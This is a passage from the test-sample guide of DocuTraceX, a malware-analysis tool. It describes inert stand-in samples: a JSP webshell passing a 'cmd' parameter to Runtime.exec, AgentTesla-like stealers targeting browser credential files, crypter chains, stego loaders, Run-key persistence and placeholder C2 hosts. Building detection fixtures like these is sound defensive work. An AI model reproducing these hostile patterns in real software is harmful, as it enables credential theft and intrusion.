| `windows-pe/sample_packed.exe` | A valid PE32+ that **looks packed**: two `UPX`-named sections (one high-entropy, writable+executable) and no import table. The **Binary** tab shows the pefile triage (type, arch, subsystem, sections with entropy) and rules fire for the packer sections, the high entropy, the W+X flags and the entry point outside `.text`. Inert — it carries no code. **Packer / unpack** tab: UPX detected and **unpacking attempted** — with UPX provisioned `upx -d` runs and, since the UPX data is fake, fails cleanly (`failed`); on a real UPX/AutoIt/Inno/NSIS/SFX/Nuitka/Enigma binary the unpacked files appear in **Nested** (recipe `unpack → upx`) and are analysed recursively. |
| `windows-pe/sample_inno_new.exe` | An inert stand-in for an **Inno Setup 6.4+** installer: a valid PE stub with the loader offset table at **revision 2** and the `Inno Setup Setup Data (6.4.2)` marker, no payload. **Packer / unpack** tab: Inno Setup detected; innoextract 1.9 (which stops at Inno Setup 6.1) rejects it as *newer than it reads*, and the app falls back to **innounp** (2.71, Inno Setup up to 7.1). With innounp the attempt fails cleanly (there is no payload); on a real installer the files and `install_script.iss` (its `[Run]` entries and `[Code]`) appear in **Nested**, and the script is mined for IOCs. Without innounp the finding says so and points to *Diagnostics → Retry innounp*. |
| `windows-pe/sample_sfx_rar_comment.exe` | An inert stand-in for a **WinRAR SFX** dropper whose RAR archive sits a little into the overlay, after the SFX comment (UTF-16 `*** … ***` with `Setup=` / `Silent=`): a PE stub with the WinRAR SFX strings, the comment, then a RAR marker block only. **Packer / unpack**: detected as *RAR SFX* (before, only an archive right at the start of the overlay was); 7-Zip finds nothing to extract. Seen on real RedLine droppers. |
| `archives/sample_inno_parts.zip` | What innounp leaves of an Inno Setup **downloader**, zipped so each part is a nested child: `embedded/CompiledCode.bin` (the compiled `[Code]`, an inert Pascal Script `IFPS` stand-in calling `DownloadTemporaryFile`, `CreateDownloadPage`, `Exec`, `ShellExec`, `RegWriteStringValue` and `URLDownloadToFileW@urlmon.dll`, with a UTF-16 URL `https://cdn-update.example.net/offers/config.json`), a binary settings blob with UTF-16 `203.0.113.47` and a telemetry URL, a language file and a 2×2 PNG. **Nested**: the `[Code]` is read (download / execute / registry findings, *downloads and runs* medium); the blob shows *binary · N string(s) read for IOCs*, the `.isl` *text · read for IOCs*, the PNG *PNG 2×2 · checked for hidden data* — no child is left "not analyzable". **IOCs**: both URLs and the IP; `urlmon.dll` is not one. |

> `.exe`/`.dll` and other PE images get **static triage with pefile** (header, sections/entropy, imports grouped by behaviour, resources, signing, packer detection) and keep the generic file record (hashes, YARA, report). They are not disassembled; packed/installer PEs are **unpacked statically** (top level and inside archives/nested children) and the unpacked files analysed as children — deep RE stays with a dedicated tool. With **FLOSS** provisioned, decoded strings are mined for IOCs.

## Files without an extension (`noext/`)

The type is decided by the extension first; these have none, so they test the content-based fallbacks.

| File | What you should see |
| --- | --- |
| `noext/sample_installer` | `installers/sample_installer.msi` without its extension. It is recognised as an **MSI by its streams** (`_StringData`, `_StringPool`, `_Tables`, `_Columns`), not by its name. You get the same analysis as the `.msi`: the **MSI** tab, the 7-Zip extraction in **Nested**, and the PowerShell downloader through the scripting engine. There is no generic *file* record, and Tasks has no `7zip probe` step. |
| `noext/sample_archive` | A ZIP with **4 KB of junk in front** (an archive carved out of another file, or one behind an SFX stub). The app finds no signature at offset 0, so the **7-Zip probe** runs: Tasks shows `7zip probe … zip archive (recognised by 7-Zip)`. The **Archive** tab lists the entries (kind `7zip:zip`), and `instalar.bat` and `actualizador.ps1` are analysed in **Nested** (Batch / PowerShell; `198.51.100.23` and `cdn-update.example.net` appear in **IOCs**). Needs 7-Zip; without it the probe step shows *unavailable* and the file gets the generic record. |

> An unrecognised file is offered to 7-Zip only for **archive formats** (zip, 7z, rar, gzip, tar, cab, iso, arj, lzh, wim…). 7-Zip also opens OLE compound files, PE, ELF, PDF and CHM, but their raw streams are not archive entries, so those are left to their own parsers. An OOXML package without an extension is not sent to 7-Zip either.

## Java

| File | What you should see |
| --- | --- |
| `java/sample_app.jar` | An executable JAR. The **Java** tab shows the MANIFEST (`Main-Class`, and a `Premain-Class` → **Java agent** finding) and the bundled `Shell.class`, whose constant pool references `Runtime.exec`, `java.net.URL.openStream`, `ScriptEngineManager`, `defineClass`, `javax.crypto` and a stage URL — rules fire for exec/download/script-engine/defineClass/base64/crypto and the attack chain. With **CFR** + a JVM the class is decompiled to source; otherwise the constant pool carries the signal. The archive is also unpacked into the **Nested** tree. |
| `java/sample_webshell.war` | A WAR with a **JSP webshell** (`request.getParameter("cmd")` → `Runtime.getRuntime().exec`), a `web.xml` servlet mapping and a bundled `Shell.class`. The **Java** tab flags the JSP input + exec and the web descriptor; entries are recursed in **Nested**. |

> `.jar`/`.war`/`.ear` are ZIP packages, so they are extracted and every entry (including nested jars) is scanned recursively; loose `.class`/`.jsp` are analysed directly.

## Containers and OneNote

| File | What you should see |
| --- | --- |
| `disk-images/sample_image.iso` | An ISO9660/Joliet disk image carrying `factura.pdf.lnk` + `instalar.bat` — the **Mark-of-the-Web bypass** pattern (mount, double-click the LNK). DocuTraceX extracts the image and scans both: the **Nested** tree shows the LNK (LOLBin + hidden window, its command through the scripting engine) and the batch dropper. |
| `archives/sample_cabinet.cab` | A Microsoft Cabinet holding the batch dropper and the PowerShell stage-2. The CAB is unpacked (stored/MSZIP) and each entry deobfuscated in **Nested** (Batch + PowerShell tabs). |
| `archives/sample_archive.tar.gz` | A gzip tarball of the obfuscated scripts — extracted and recursed like any archive. |
| `onenote/sample_notes.one` | A **OneNote** section with two embedded `FileDataStoreObject` lures (an HTA and a VBS). The **OneNote** tab lists the carved payloads; they are then deobfuscated in **Nested** (VBScript/JavaScript/PowerShell). This is the "fake click-to-view button" technique. |

> Containers (ISO/UDF images, CAB, tar/.gz/.bz2/.xz) and OneNote are all handled as **extract → recurse**: every carried file is scanned by the right engine, wherever it hides (standalone, in an email, or nested inside another container).

## Lab: test the network checks safely

`email/phish_lab.eml` (inside the archive) is the same campaign with its link and an attached login form pointing to a **local phishing-kit simulator**:

```bash
python scripts/phish_lab.py      # serves http://127.0.0.1:8808 (Ctrl+C to stop)
```

Open the email in DocuTraceX and press **Check** on the `127.0.0.1` URL in the IOCs tab. The simulator behaves like a real kit: a bot filter (no browser headers → 404), a redirect, a Microsoft 365 look-alike login prefilled with the address from the link, an obfuscated script that "exfiltrates" to a `*.example` URL, a different page for iPhones (cloaking), and — after **Send fake credentials** — an MFA page linking to a `.docm` download. The simulator's console prints the fake identity it receives.

## Third-party

| File | Source | License |
|---|---|---|
| `excel/sample.xlsb` | [oletools](https://github.com/decalage2/oletools) `tests/test-data/excel4-macros/excel4_sample_macro.xlsb` (benign: `ALERT` + `HALT`) | BSD-2-Clause, © Philippe Lagadec |

<!-- gmzpt -->

Everything else is generated by `scripts/make_samples.py` with the builders in
`scripts/` (`officekit`, `ovba`, `cfb`, `rtfkit`, `pdfkit`, `mailkit`, `mkmsg`).

## Hex tab

The Hex tab needs no sample of its own. Use these:

| Try | With |
| --- | --- |
| **Structures**: colours and the region list | `windows-pe/sample_win32_invoice_calc.dll` shows DOS header and stub, Rich header, COFF / optional headers, data directories, section table, sections, and the import, resource, debug and relocation directories. `dotnet/sample_dotnet_loader_ml.exe` adds the .NET COR20 header, metadata and managed resources. `linux-elf/sample_elf_miner` shows ELF headers and sections. `windows-pe/sample_lief_helper.dll` has an overlay. |
| **Inspect** | Click any byte of a PE header, for example the COFF `TimeDateStamp` at `PE+8`; the panel shows it as Unix time. |
| **Decode** + **Extract as nested** | `powershell/sample_encoded_blobs.ps1`: <ol><li>Search regex `H4sI[A-Za-z0-9+/=]+`.</li><li>Recipe `base64 \| zlib` gives the config with the C2 URL.</li><li>Press *Extract as nested*.</li></ol> After the re-analysis it is a child of the case, and its URL is in IOCs. |
| **XOR** (multi-step) | `powershell/sample_xor_stager.ps1`: <ol><li>Select the blob; `base64 \| xor 696e76` (the script's key `inv`) gives the next stage. `xor auto` only finds single-byte keys.</li><li>Extract that stage as nested and open it in Hex.</li><li>Decode its inner base64 with `base64 \| zlib` to get the final `DownloadString` of `stage4.ps1`.</li></ol> |

## IOC noise checks

Indicators that must **not** appear in the IOCs tab:

- **`email/sample.eml`** — the `pedido.doc` attachment is RTF sent as `application/msword`:
  - emldump's dump of that part is RTF markup and hex padding, so it is not mined;
  - nothing like `\\d}}{\fldrslt` or `0000…ffff…` should show up;
  - the RTF itself is analysed as a nested child, and its real URLs and paths still appear.
- **`android/sample_native_libs.apk`** — the same `libapp.so` is built for two ABIs (`lib/arm64-v8a`, `lib/x86_64`):
  - **Components:** two tabs, **ELF · libapp.so · arm64-v8a** and **ELF · libapp.so · x86_64**.
  - **IOCs:** none of its `DT_NEEDED` libraries (`liblog.so`, `libc.so`, `libm.so`…) are "domains" (`.so` is also a ccTLD).
  - **IOCs:** the `::` string is not an IPv6.
- **`email/sample.eml`, `email/sample.msg`, `word/sample.docm`, `pdf/sample.pdf`, `word/sample.rtf`**:
  - olevba's description "May run PowerShell commands" is not a command;
  - the smuggling page's `a.download = …` is not the domain `a.download`;
  - the MD5s that rtfobj prints for the objects it carves (`MD5 = '…'`) are not hashes of the sample.
- **`javascript/sample_marker_drop.js`**: the dropper writes a 1-byte lock file and a real `upd.ps1`. Only the `.ps1` becomes a nested child. Tiny non-code drops and stages (markers, counters, "ok") are not stages; short code (a `.bat` with `start x.exe`) still is.
- **`batch/sample_ioc_noise.bat`** — signed-MSI / bundled-runtime noise is dropped: CA hosts (`crl3.digicert.com`, `sectigo.com/CPS`),
  CPython license hosts (`www.pythonlabs.com`), code members (`builtins.id`, `self.af`, `os.py`, `1.invalid`, `action.name`),
  MSI properties (`[RuntimeVsdnetRTName].NET`), OID tails (`1.3.6.1`), build-agent paths (`D:\a\1\s\…`), `cmd = 'LIST'`, `nc += prev`.
  Real indicators (`billing-portal.example`, `C:\Users\Public\…`) still appear. FLOSS strings of a PE are never mined for hash-like values (GUIDs / constants), and `system.net`, `16.10.0.0` (versions), `myapplication.app` (VS manifest) are not IOCs. Also dropped in real MSIs: certificate serials /
  thumbprints / issuers, hex blobs split in lines, minified-JS members (`e.top`, `this.data`).
- **Any PE / ELF analysed with capa** — capability and ATT&CK names ("query or enumerate registry key", "Query Registry") are not commands.

## Go binaries (Components → Go)

The **`go/`** folder of `samples.zip` holds inert Go-like binaries: binkit stubs
whose only code is `ret`, carrying the Go structures in their real layouts —
BuildInfo (inline strings, Go 1.18+), pclntab (magic `0xfffffff1`, Go 1.20+) with
its function names, moduledata pointing back at it and the Go build ID. Built by
`go_samples()` in `scripts/make_samples.py`.

| Sample | What it shows |
| --- | --- |
| `go/sample_go_agent` | ELF, stripped (no symbols / DWARF): **Confirmed**, `go1.22.5`, module `example.com/invoicesync`, 2 dependencies, build settings (`-ldflags="-s -w -H=windowsgui"`, `CGO_ENABLED=0`) |
| `go/sample_go_agent.exe` | the same as a PE (pclntab in `.rdata`, Go build ID string) |
| `go/sample_go_agent_debug` | not stripped (symbol table + DWARF) |
| `go/sample_go_damaged_buildinfo` | BuildInfo corrupted: still **Confirmed** from pclntab + moduledata + build ID, flagged *metadata altered* |
| `go/sample_go_garble` | package names renamed like Garble does: *Garble-style names* finding |
| `go/sample_go_hidden_pclntab` | A Go implant as garble or a modified toolchain leaves it (inert ELF): **no pclntab magic, BuildInfo unreadable**, only the Go runtime's own messages (`runtime.main not on m0`, `sweep increased allocation count`, `GODEBUG`…), which garble's `-literals` does not touch. **Go** tab: *Likely* (runtime messages + runtime), traits *pclntab missing* and *garble*: function names and config are not readable statically. Real garbled Sliver builds came out *Not detected* before. |

GoReSym (the contrast tool) only accepts real Go binaries, so on these stubs it
reports *no valid pclntab found* — the Go tab shows that next to the own parser's
result. Any real Go program (`go build`) is identified the same way, and GoReSym
agrees on it.

## Code analysis (Go → Functions / Code, and the Code tab)

Two binaries with a few **real x86-64 functions** (hand-encoded, never run) so
the code analysis has something to show: `main` → a XOR loop that decodes a
buffer in place → a function that hands the invoice C2 URL
(`https://cdn-update.example.net/invoice/sync`) to an HTTP call. Built by
`code_samples()` in `scripts/make_samples.py`. Needs Rizin + rz-ghidra
(Diagnostics → Retry *rizin*).

| Sample | What it shows |
| --- | --- |
| `go/sample_go_code.exe` | Go PE whose pclntab really maps `main.main`, `main.decryptConfig`, `main.beacon`, the closure `main.main.func1` and `net/http.(*Client).Do`: the names come back in Functions / Code and in the pseudocode; `main.beacon` ranks first (*communications* + URL, read as a Go string: pointer + length), `main.decryptConfig` is flagged as a XOR loop. **Call graph**: `main.main` (*entry · goroutine · defer*) launches `main.main.func1` with `go` (dashed edge), which calls `main.beacon`; the path *main.main → main.main.func1 → main.beacon → net/http.(\*Client).Do* is listed, and the CFG of `main.decryptConfig` shows its loop (back edge). **Resources**: a `go:embed` file system with `assets/config.json` (C2 URL + `203.0.113.47`) and `assets/readme.txt`, a self-signed certificate for `cdn-update.example.net` (its key was never kept) and a gzip-compressed invoice note — the files are analysed as nested children and their IOCs land in the IOCs tab; **Dependencies** shows both declared modules as *no code found*. **Types**: the method `main.(*Config).load` gives the type `main.Config` (from the function table — GoReSym refuses these stubs; on a real Go build it adds every struct with its fields, the interfaces and the source file paths). **Crypto**: `main.openConfig` calls `crypto/aes.NewCipher` → `cipher.NewGCM` → `gcm.Open` with a 32-byte key and a 12-byte nonce it points at: both are listed as key material and the sealed config is **decrypted statically** (AES-256-GCM, authenticated) to the C2 JSON (`cdn-update.example.net`, `203.0.113.47:8443`) — its IOCs land in the IOCs tab; `main.decryptConfig`'s XOR loop (key `0xa5`) gives `sleep=60;jitter=15;id=INV-0413;x`; the AES S-box and SHA-256 constants are found too. **Capabilities**: `main.runCmd` (`os/exec.Command` + `cmd.exe /c whoami /all`) → *Command execution* T1059; `main.persist` (`registry.OpenKey` / `SetStringValue` + the `CurrentVersion\Run` key) → *Run key persistence* T1547.001; `main.beacon` → *HTTP(S) communication* T1071.001 (reachable from `main.main` through the goroutine); the two static decryptions → T1140 — the high-confidence ones are findings. The stubs only `ret`: nothing is written to the registry and no command exists to run. **Garble**: `main.main.func2` is a closure built like Garble's `-literals` output (encoded bytes on the stack, a key that changes every byte, then `runtime.slicebytetostring`); only that routine is emulated, on a simulated CPU in a separate process, and it gives `C:\ProgramData\InvoiceSync\agent.exe` (Strings → source *Garble (emulated)*, and the IOCs). **Interfaces**: `main.useConfig` loads an itab and calls its first method through a register — the call is resolved to `main.(*Config).load` (dotted edge in Call graph, listed in Code). **Func values** (phase 5): `main.runHook` loads a funcval and calls its `fn` through a register — resolved to `main.beacon` (dotted edge, *func value / closure call(s) resolved* in Code). **Source lines** (phase 2): every function carries its `file:line` from pclntab (`main.go:12` for `main.main`, `crypto.go` for the decryption routines, the Go toolchain / module cache for library code), and Types → *Source files* shows **Built by** `facturacion` · project `C:/Users/facturacion/dev/invoicesync` — also an info finding `go:build_paths` (built without `-trimpath`). Analysing the same file again in another case reuses the code analysis (*cached*). Its read-only data also holds a **PowerShell stager** and an **HTML invoice template** as Go string literals: Code → *Resources* lists them under *Scripts and templates in string literals*, the PowerShell one is carved (`.ps1`) and analysed as a nested child (`code:embedded_script`), and *Dependencies* lists the standard-library packages that say what it can do (`os/exec`, `net/smtp`, `html/template`, `crypto/aes`…). **C2** (on demand): a *Go implant* configuration exported from the Go analysis — `https://cdn-update.example.net/invoice/sync` and `203.0.113.47` from the `go:embed` config (high), the URL used by `main.beacon`, which calls `net/http` (medium) — each with where it came from (`c2:go`). **Phase 8**: `main.loadSecret` derives its key with `pbkdf2.Key("InvoiceSync-2026!", salt, 4096, 32, sha256.New)` and opens an AES-256-GCM blob — the key is **derived statically** (Crypto → *Key derivation*: PBKDF2-HMAC-SHA256, 4096 iterations) and the payload is **decrypted and then decompressed** (*AES-GCM … with a PBKDF2-derived key → gzip*) to a second C2 JSON (`relay.invoice-sync.example`, `198.51.100.88:443`); *Functions using cryptography* shows the route from the entry point (*main.main → main.main.func1 → main.loadSecret*). |
| `windows-pe/sample_code_loader.exe` | native PE32+ (not Go): Components → **Code** — 3 functions (Crypto decodes the XOR-encoded buffer), the one calling `InternetOpenA` / `InternetOpenUrlA` with the URL first, the XOR loop second; APIs lists the wininet imports with the function that calls them |
| ↳ Decompile all (background) | Analyse it with `DOCUTRACEX_CODE_DECOMPILE=1` (only the top function decompiled automatically): **Functions** shows *Decompile all 2 without pseudocode*. The job runs on the server (one Rizin session per 5 functions), the list gets its **C** badges as chunks land, and the tab can be left and re-opened (progress and *Stop* while running; *last run: 2 decompiled* after). Functions the automatic pass left as *too large* get their own *Decompile the N large function(s)* button. |

## Images with a hidden file (any image of a case)

Every image that reaches **Nested** (archive members, attachments, resources,
extracted objects) and the case's own file when it is an image are decoded
(Pillow) and their pixels read the ways loaders write them: bytes by rows /
columns in RGB · BGR · RGBA · ARGB · BGRA, and LSB (1–2 low bits) by rows /
columns, MSB / LSB first; each stream as it is, after a 4-byte length, as
Base64, compressed, single-byte XOR, or XOR / AES with the keys of a carrying
.NET assembly. Only a **well-formed** file is kept (PE, ELF, Mach-O, ZIP, 7z,
RAR, gzip, PDF, OLE, shebang / PowerShell script), cut to its real size.

| Sample | What it shows |
| --- | --- |
| `archives/sample_stego_invoice.zip` | `factura_scan.png` (noise-like picture) hides an inert ELF in the low bit of R, G, B (*LSB1 RGB, MSB first*): **Nested** → the PNG has the child `factura_scan.pixels.elf` and the finding *ELF hidden in the pixels of the image* (high, T1027.003); the ELF's string `cdn-update.example.net` reaches the IOCs. `leeme.txt` is plain. |
| `images/sample_logo_appended.png` | a real 48×24 logo with an inert PE **appended after `IEND`**, XOR-ed with `0x5c`: child `…hidden.exe` (*appended after the image end (offset …): XOR 0x5c*). Same check after a JPEG `FFD9`, a GIF trailer or a BMP's declared size. |
| `windows-pe/sample_rcdata_loader.exe` | native PE (no .NET): `RT_RCDATA/CFG` holds a **Base64**-encoded inert PE and `RT_RCDATA/LOGO` is a BMP with an inert ELF in its pixels → two children, `…RT_RCDATA_CFG.exe` and `…RT_RCDATA_LOGO.elf`, finding *hidden in the resource …* (`RT_BITMAP` is rebuilt as a BMP file first). |

The sweep also looks at **every image the case extracted** even when it is not a
child (Office media, PDF / OneNote images…), with the **strings of the whole case
as keys** (.NET literals, strings decrypted statically, .resources values), and a
**stage loop** analyses each new stage: a .NET stage hidden in a Bitmap is analysed
as .NET and its own resources / hidden files are queued again (up to 4 rounds) — e.g.
`make_samples.dotnet_bitmap_loader_exe(make_samples.dotnet_stealer_exe())` ends with
the stealer's SMTP settings decrypted.

## .NET assemblies (Components → .NET)

Built by `dotnet_samples()` in `scripts/make_samples.py` with `scripts/dnkit.py`
(a small CLR metadata writer): well-formed tables and heaps; method bodies are
tiny inert IL (`ldstr` / `call` / `ret`) that is only disassembled, never run.

| Sample | What it shows |
| --- | --- |
| `dotnet/sample_dotnet_loader.exe` | `InvoiceViewer` 2.1.0.0 (runtime v4.0.30319, entry `InvoiceViewer.Program::Main`): **P/Invoke** `kernel32!VirtualAlloc` + `CreateThread` (finding *shellcode loading / injection*), framework APIs `WebClient.DownloadData`, `Assembly.Load` (finding), `RegistryKey.SetValue`, `RijndaelManaged.CreateDecryptor`; the **ConfuserEx** marker attribute (finding *obfuscator*); an AES-encrypted resource `stage2.bin` (high entropy) and a Costura-embedded `costura.invoicehelper.dll.compressed` — both resources are extracted and analysed as **nested** children (Costura's is deflated first, giving an inert `MZ`+text `invoicehelper.dll`); user strings with the C2 URL and `203.0.113.47` (IOCs) |
| ↳ CIL (phase 2) | **Methods of interest**: `InvoiceViewer.Program::LoadStage` (loader + network: `WebClient::.ctor` → `DownloadData` → `Assembly::Load`, loads the C2 URL) first, then `Program::Main` (persistence: `RegistryKey::SetValue` with the `…\CurrentVersion\Run` key). The `Assembly.Load` finding names the method; the IOCs carry the method as provenance. |
| ↳ `.resources` | `InvoiceViewer.Properties.Resources.resources` is opened (ResourceReader v2): entry `UpdateHost` = `cdn-update.example.net` (IOC, provenance `resources › UpdateHost`) and the `byte[]` entry `invoice_stage3` — an inert `MZ`+text stub, finding *PE embedded in managed resource*, extracted as the nested child `…invoice_stage3.exe`. |
| ↳ Strings decrypted statically (phase 2b) | `Program::Configure` passes two encrypted literals to `StringCipher::Decrypt` (CIL: `FromBase64String`, `CreateDecryptor`, `xor`, key literal `InvoiceSync2024`) and `StringCipher::Unmask` (`FromBase64String`, `xor`, key `inv`). **Strings** tab → *Decrypted statically*: `smtp.billing-portal.example` (AES-128-CBC, key MD5("InvoiceSync2024")) and `203.0.113.47:587` (Base64 + XOR "inv"); finding *encrypted strings decrypted statically* (T1140); both are IOCs with provenance `decrypted › InvoiceViewer.Program::Configure`. |
| ↳ Static arrays + encrypted resource | `Configure` also passes a static `byte[48]` (`ldtoken` + `RuntimeHelpers.InitializeArray`, data at a FieldRVA) to `Unmask` → `https://cdn-update.example.net/invoice/sync/gate` (*byte[] + XOR key "inv"*). `StringCipher::OpenStage` reads `stage2.bin` with a static 16-byte key and `CreateDecryptor`: the resource is **decrypted statically** (AES-128-CBC, iv 0) into the nested child `…stage2.bin.decrypted.exe` (inert `MZ`+text), finding *encrypted resource decrypted statically* (high). |
| `dotnet/sample_dotnet_stealer.exe` | `InvoiceMailSync` 1.4.0.0, an AgentTesla-like stealer: credential paths plain (Chrome *Login Data*, Firefox *logins.json*), exfiltration settings AES-256-CBC encrypted (key SHA-256("MailSync#Builder")) and decrypted by `Settings::Dec`. **.NET → Strings → Decrypted statically**: `smtp.billing-portal.example`, `accounts@billing-portal.example`, `587`. **C2 / Beacons**: *AgentTesla-like stealer*, SMTP `smtp.billing-portal.example:587`, account `accounts@billing-portal.example` — method says *settings decrypted statically by the .NET analysis*. |
| `dotnet/sample_dotnet_resource_loader.exe` | `InvoiceLauncher` 1.0.3.0, the **AES resource loader** in front of many XWorm / AgentTesla builds: the `.resources` entry `Client` is the next stage (the inert `c2/xworm/sample_xworm_named.exe`) encrypted with AES-128-ECB and MD5 of a key string. The key is **not in the decrypting method** (`Stage::Open`, RijndaelManaged + MD5): the class' static constructor keeps it (`Stage::.cctor` ldstr `Fx7InvoiceLaunch2026`). **Resources**: finding *encrypted resource … › Client decrypted statically → exe* (high, T1140), nested child `…Client.decrypted.exe` (recipe *decrypt: AES-128 ECB*). **C2**: the XWorm config of the second stage (`invoice-sync.example.net:7000`, `203.0.113.47:7000`). |
| `dotnet/sample_dotnet_crypter_chain.exe` | `InvoiceRental` 3.2.0.0, the **three-stage crypter** seen in front of NanoCore and AgentTesla. (1) `Rental::InitializeComponent` decrypts the `.resources` entry `mn` with an **inline RC4** (256-entry table, `& 255`, `xor`) and the literal key `R7E4NT2026INV8QK5` → stage 2, an inert PE stub. (2) `Main` hands stage 2 the Bitmap name and its XOR key **as hex text** (`505658` = "PVX", `7a1e5c`). (3) The Bitmap `PVX` holds the last stage (the inert `c2/xworm/sample_xworm_named.exe`) column by column, BGRA bytes, with a 4-byte length first and a 3-byte XOR. Every column ends in **empty pixels** that the loader skips. **Resources**: *encrypted resource … › mn decrypted statically → exe* (RC4); *EXE hidden in the pixels of the Bitmap … › PVX*. The XOR key is **recovered from the zeros of the DOS header** when the assembly doesn't have it, and streams with padding holes are rejected. **C2**: the XWorm config of the last stage. |
| `dotnet/sample_dotnet_bitmap_loader.exe` | `InvoiceGallery` 3.0.1.0, the **steganographic Bitmap loader** of many AgentTesla / Formbook campaigns: the `.resources` entry `Gallery` is a serialized `System.Drawing.Bitmap` (an uncompressed **BMP** carved inside the entry's own bounds), followed by an innocent PNG `Logo` that must not be mistaken for it (the real loader b81e4c09… is built the same way). Its pixels, read column by column (R, G, B) and XOR-ed with the literal `4417290360015521`, are an inert PE stub (trimmed to the end of its last section). **Resources**: *hidden exe in pixels* → nested child `…Gallery.pixels.exe`; finding *PE hidden in the pixels of the Bitmap* (high, T1027.003). **Methods of interest**: `Gallery::Decode` first (*stego* — `GetPixel`, `Color.get_R/G/B`, `xor` — and *called by a loader*), then `Program::Main` (`ResourceManager.GetObject` → `Decode` → `Assembly.Load`). |
| `dotnet/sample_dotnet_confuser_constants.exe` | *InvoiceUpdater.exe* protected like **ConfuserEx's constants protection (Normal mode)**: its literals (the C2 URL `http://cdn-update.example.net/gate.php`, `203.0.113.47`, a mutex, a decoy file name, a Run key) are not in `#US` but in one encrypted `uint[]` — LZMA records XORed with a 16-word key derived by xorshift from a seed — and each use is `ldc.i4 <id>; call Get(uint)` with the id encoded as `(id * inv(k1)) ^ k2`. The .NET analysis reads the seed, the array and the decoder constants from the CIL and recovers the five literals statically, each with the method that uses it (`dotnet:confuser_constants`); they become IOCs and C2 input. Inert: the bodies only load constants. |
| `dotnet/sample_dotnet_decompile.exe` | *InvoiceSyncAgent.exe*, marked as **Dotfuscator**-protected, whose prioritised methods hold a branch (`if (!string.IsNullOrEmpty(url))`), a download + `Assembly.Load` of `https://sync.invoice-agent.example/stage`, a Run-key write and a `Process.Start`. The .NET view → **Code (IL / C#)** shows their readable IL (`IL_000a: brfalse.s IL_000d`, calls by name); **Decompile** / **Decompile module** run ILSpy CLI on those methods only, after de4dot `--strtyp none` because an obfuscator was detected (Diagnostics → Retry `ilspy` / `de4dot` to provision them). Inert: the bodies only load constants. |
| `dotnet/sample_dotnet_bitmap_stealer.exe` | The Bitmap loader above whose hidden **stage 2 is the AgentTesla-like stealer**: the .NET analysis takes the stage out of the pixels, and **C2** reads the stealer's AES-encrypted SMTP settings from it, showing the provenance — `… › Gallery › bitmap pixels: … XOR key … › …pixels.exe`. Objects derived from the sample (resources, pixels, stages, decrypted / hidden files) are scanned first, so a big extraction never pushes them out. |

## FLOSS and capa: speed

On each PE, FLOSS and capa run **at the same time** (two processes), and the PEs
of a nested batch (an MSI's kits, an archive's binaries, unpacked files…) are
**started ahead** on a small pool while the scan goes on, so their results are
usually ready when the PE triage reaches them. `DOCUTRACEX_TOOLS_PARALLEL`
binaries at once (default 2 — each one is two vivisect processes, memory-hungry;
never above CPUs − 1). Obviously packed PEs (an executable section near entropy 8),
PyInstaller bundles and files over 64 MB are not started ahead (the triage decides
whether their tools run at all). Also:
- **cache by SHA-256 across cases** (`<cases>/.tools_cache/`, keyed by the tool build
  and its options): re-analysing a case, or meeting the same DLL in another case, is instant;
- **libraries signed by a trusted publisher** (valid Authenticode — Microsoft, Python
  Software Foundation, Oracle, Google, Qt…: `python311.dll`, `vcruntime`, Qt…) are not
  analysed (`DOCUTRACEX_TOOLS_SKIP_TRUSTED=0` analyses them); a broken or untrusted
  signature never qualifies, so a side-loaded fake `vcruntime140.dll` still is;
- **large files** (> 15 MB, `DOCUTRACEX_FLOSS_LARGE_MB`): FLOSS without *tight strings*
  (the slowest part) on the whole file, decoded and stack strings kept. The tight strings are
  **not lost**: once the code analysis has ranked the functions, FLOSS runs again with
  `--only tight --functions …` on the **priority functions** only (the analyst's code with
  loops / XOR, best ranked first, up to 128 — `DOCUTRACEX_FLOSS_PRIORITY_FUNCS`), cached
  like the full run. They appear in **Code → Strings** and on their function as
  *FLOSS tight (priority functions)*, are mined for IOCs, and the Code summary counts them.
  For a file that matters, **Code → Strings → Full FLOSS (every function)** runs the
  complete FLOSS in the background (the tab can be left); the strings it adds show as
  *FLOSS tight (full run)*, and the run is cached, so re-analysing the case uses it
  (tight strings everywhere, IOCs included) instead of the lighter one.
  `windows-pe/sample_bloated_invoice.exe`, `windows-pe/sample_pyinstaller.exe` and the MSI / archive samples
  exercise the size limit; to see the priority pass on a small file, analyse
  `windows-pe/sample_code_loader.exe` (its XOR decode loop is a priority function) with
  `DOCUTRACEX_FLOSS_LARGE_MB=0`.

## Reports → Markdown (raw, for an LLM)

Next to the report, **Markdown (raw, for an LLM)** has one sub-tab per part of
the analysis — Summary, Findings (with marks), IOCs, Nested / stages, Decrypted,
Code (functions by priority + the pseudocode of the 25 best decompiled ones),
.NET (methods of interest, decrypted strings, resources), Machine Learning, C2,
Network checks and every module's raw JSON — each with **Copy** and **Download
.md**, plus **Download everything**. Same content the AI tools read, for when no
model is connected: paste it into any LLM or a ticket. Try it on the case of
`make_samples.dotnet_bitmap_loader_exe(make_samples.dotnet_stealer_exe())`.

## AI tab and MCP: asking about the code of a case

The AI chat (your OpenAI-compatible / LiteLLM endpoint, or a local one) and the
MCP server (`python -m docutracex.mcp_server`) share read-only tools. Besides
findings, IOCs, modules and network checks they reach the deep analyses:
`list_code_objects` → `list_functions` (by priority / behaviour) →
`get_function` (pseudocode, disassembly, callers, callees, strings; for .NET the
calls, literals, static arrays and what the method decrypts), `get_decrypted`
(everything decrypted statically, with the routine), `get_nested_tree` (stages
and how each was obtained) and `get_ml` (scores, unusual-for-the-model, similar
objects in other cases). Try on `make_samples.dotnet_bitmap_loader_exe(make_samples.dotnet_stealer_exe())`:
"¿qué descifra el método Main del stealer?" → `smtp.billing-portal.example`,
`accounts@billing-portal.example`, `587`; on `windows-pe/sample_code_loader.exe`:
"¿qué hace la función de red?" → its pseudocode with `InternetOpenUrlA` and the C2 URL.
The model must support tool calling; answers are trimmed to fit its context.

## YARA, Machine Learning and C2: choosing the objects

The three tabs have **Objects to scan** under the case selector: every object of
the case (the original and everything extracted, unpacked, decrypted or carved —
named by its nested chain) with a checkbox, a filter, *All / None / Only the shown
ones* and one button per type (PE, image…). A run covers the ticked objects only
and **keeps the previous results of the others**; nothing ticked → nothing runs,
all ticked → the whole case, as before. Objects are scanned **in parallel**
(YARA in threads, C2 in worker processes, ML in a few scoring processes; up to
CPUs − 1, `DOCUTRACEX_SCAN_WORKERS` overrides). Try it on
`make_samples.dotnet_bitmap_loader_exe(make_samples.dotnet_stealer_exe())`: tick
only `…Gallery.pixels.exe` in C2 → *AgentTesla-like stealer*, SMTP
`smtp.billing-portal.example`; then only the original → the stealer's config stays.

## C2 / Beacons tab

